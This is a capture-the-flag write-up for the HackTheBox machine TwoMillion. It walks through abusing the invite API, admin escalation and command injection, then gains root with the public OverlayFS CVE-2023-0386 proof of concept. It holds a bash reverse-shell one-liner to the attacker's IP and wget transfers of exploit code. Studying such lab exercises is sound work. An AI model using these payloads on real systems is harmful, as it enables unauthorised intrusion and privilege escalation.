---
layout: post
title: TwoMillion
date: 2025-06-16 00:34:00 +0800
categories: [HackTheBox, Easy]
tags: [Remote Code Execution,OS Command Injection,Misconfiguration,Command Execution,PHP,JavaScript]
author: klein
image:
  path: /images/images-twomillion/image_42.png
  
---

Since I'm starting fresh, I'll be using the "Guided Mode" on this retired box. The write-up will be tailored around the path and questions of how the "Guided Mode" navigates this box.

**How many TCP ports are open?
Let's start with an Nmap scan to find out how many TCP ports are open.

```
nmap -sV -sT 10.129.229.66 -oA nmap.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-16 02:52 EDT
Nmap scan report for 10.129.229.66
Host is up (0.071s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.01 seconds

```
By typing the IP address into the search bar we see that it gets redirected to 2million.htb

![b](/images/images-twomillion/image_1.png)

Let's add this file to the /etc/hosts file.

```
vim /etc/hosts
```
![b](/images/images-twomillion/image_2.png)

After saving the /etc/hosts file and refreshing the page, we will be presented with the webpage.
![b](/images/images-twomillion/image_3.png)

**What is the name of the JavaScript file loaded by the /invite page that has to do with invite codes?
By searching around 

By going to the /invite directory of the webpage and opening up the developer tools then going to the Network tab and refreshing the page we will find the *inviteapi.min.js file.
![b](/images/images-twomillion/image_4.png)


**
What JavaScript function on the invite page returns the first hint about how to get an invite code? Don't include () in the answer.

By double-clicking on the inviteapi.min.js JavaScript file we that it is obfuscated/minified, but by looking at strings in the code I was able to find a function named **makeInviteCode that led me to the next question.

I found this function by opening up the developer tools and opening up the inviteapi.min.js file that I beutified by using a tool named de4js.
![b](/images/images-twomillion/image_5.png)
![b](/images/images-twomillion/image_6.png)


**The endpoint in makeInviteCode returns encrypted data. That message provides another endpoint to query. That endpoint returns a code value that is encoded with what very common binary-to-text encoding format. What is the name of that encoding?

The function discloses the API endpoint.


![b](/images/images-twomillion/image_7.png)

Let's query this endpoint with curl.
```
curl -X POST http://2million.htb/api/v1/invite/how/to/generate | jq . 
```
![b](/images/images-twomillion/image_8.png)

Let's use CyberChef to decrypt the message.
![b](/images/images-twomillion/image_9.png)

Let's use curl to query this new endpoint.
```
curl -s -q -X POST http://2million.htb/api/v1/invite/generate | jq . 
```
![b](/images/images-twomillion/image_10.png)

Base64 encoded text usually ends with '=' or '==' signs.
I decoded that string.
```
echo Q1hGTVEtQTlVQVotMUdVSVgtQk9FTEM= | base64 -d 
```
![b](/images/images-twomillion/image_11.png)

What is the path to the endpoint the page uses when a user clicks on "Connection Pack"?

So with the discovered invite code, we are able to register an account. After registering an account we get access to the dashboard and what used to look like HackTheBox.

![b](/images/images-twomillion/image_12.png)

By going to the Labs > Access page the Connection Pack button is going to appear.
![b](/images/images-twomillion/image_13.png)

Let's intercept a request by clicking that button.
![b](/images/images-twomillion/image_14.png)
We can see that it goes to */api/v1/user/vpn/generate

How many API endpoints are there under /api/v1/admin?

I sent the previously captured request to the repeater and started to back with the directories until I listed out the available endpoints.
![b](/images/images-twomillion/image_15.png)
This answers the question, there are 3 API endpoints under the /api/v1/admin directory.


What API endpoint can change a user account to an admin account?
By reading the descriptions the endpoint is */api/v1/admin/settings/update



What API endpoint has a command injection vulnerability in it?

The answer is the /api/v1/admin/vpn/generate endpoint, I found this out by trying out one-by-one the available endpoints.

The next step would be to change my account to have admin privileges. For this, I need to update my account with the previously mentioned */api/v1/admin/settings/update endpoint.

For this, it will be a requirement to change the content type to JSON and after that to pay attention to the error messages, based on those this will be the final request.
![b](/images/images-twomillion/image_16.png)

After that, I can start to play around with the endpoint that is vulnerable to command injection.
![b](/images/images-twomillion/image_17.png)

I used this one-liner in my command injection:
```
$(bash -c 'bash -i >& /dev/tcp/10.10.14.33/4000 0>&1')
```
![b](/images/images-twomillion/image_18.png)

Used this command to stabilize the shell:
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
Then:
```
- Ctrl + Z
```

```
stty raw -echo;fg
```

```
export TERM=xterm
```

And I got a fully functional shell.

What file is commonly used in PHP applications to store environment variable values?

The *.env file.


![b](/images/images-twomillion/image_19.png)

With these credentials, I can change to the admin user and find the user flag.
![b](/images/images-twomillion/image_20.png)

What is the email address of the sender of the email sent to the admin?

I checked and there was mysql on the box, so I connected to the with my freshly found credentials.

So I connected to the mysql server:
```
admin@2million:~$ mysql -u admin -p
```
![b](/images/images-twomillion/image_21.png)

I found the following emails and passwords but this did not lead me further.
![b](/images/images-twomillion/image_22.png)

```
find / -user admin 2>/dev/null | grep -v '^/run\|^/proc\|^/sys'
```
![b](/images/images-twomillion/image_23.png)

This is going to list everything that belongs to the admin user except run/proc/sys.
![b](/images/images-twomillion/image_24.png)

What is the 2023 CVE ID for a vulnerability that allows an attacker to move files in the Overlay file system while maintaining metadata like the owner and SetUID bits?

Based on the email there is a serious CVE, let's search based on the *OverlayFS / FUSE hint.

By doing a simple Google search we find the CVE ID that is relevant.
![b](/images/images-twomillion/image_25.png)

I used the following overview about the CVE to do the privesc.
![b](/images/images-twomillion/image_26.png)
https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/

That led me to the following GitHub page:
https://github.com/xkaneiki/CVE-2023-0386/

I downloaded the PoC to my machine.
```
git clone https://github.com/xkaneiki/CVE-2023-0386.git
```
![b](/images/images-twomillion/image_27.png)
Compiled it:
```
tar -cjvf CVE-2023-0386.tar.bz2 CVE-2023-0386
```
![b](/images/images-twomillion/image_28.png)

And started a web server to transfer the compiled Poc.
```
python3 -m http.server
```
![b](/images/images-twomillion/image_29.png)

After this I downloaded with *wget the file to the target machine.
```
wget 10.10.14.33:8000/CVE-2023-0386.tar.bz2 
```
![b](/images/images-twomillion/image_30.png)
I decompiled it:
```
tar -xjvf CVE-2023-0386.tar.bz2
```
![b](/images/images-twomillion/image_32.png)

And followed the instructions found on the GitHub page.

```
make
```
![b](/images/images-twomillion/image_31.png)

```
./fuse ./ovlcap/lower ./gc
```
![b](/images/images-twomillion/image_33.png)

In another terminal on the target box, I ran the final command to get root.

```
./exp
```
![b](/images/images-twomillion/image_34.png)

And this led me to the root flag as well.


![b](/images/images-twomillion/image_35.png)

What is the version of the GLIBC library on TwoMillion?
```
ldd --version 
```
What is the CVE ID for the 2023 buffer overflow vulnerability in the GNU C dynamic loader?

With a simple google search, it is easy to find the CVE ID.
![b](/images/images-twomillion/image_36.png)

With a shell as admin or www-data, find a POC for Looney Tunables. What is the name of the environment variable that triggers the buffer overflow? After answering this question, run the POC and get a shell as root.

By reading the exploit.c file for a Poc, this can also be easily determined.
![b](/images/images-twomillion/image_37.png)

